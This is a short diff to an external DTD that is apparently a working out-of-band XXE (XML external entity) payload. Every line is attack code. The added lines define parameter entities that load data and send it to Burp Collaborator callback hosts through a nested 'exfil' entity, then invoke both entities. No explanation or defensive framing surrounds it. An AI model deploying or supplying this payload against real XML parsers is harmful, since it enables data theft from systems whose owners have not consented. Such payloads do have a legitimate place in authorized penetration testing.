@@ -1,2 +1,4 @@
-<!ENTITY % data SYSTEM "http://x42nlokezlic8eyvqiu3v62eo5uwil.burpcollaborator.net">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://wxxmenddskbb1drujhn2o5vdh4nubj.burpcollaborator.net/%data;'>">
+<!ENTITY % file SYSTEM "http://1bddr8i50gwg28q6ybcklesba2g24r.burpcollaborator.net">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://hn8t3oulcw8weo2maro0xu4rmisjg8.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfil;
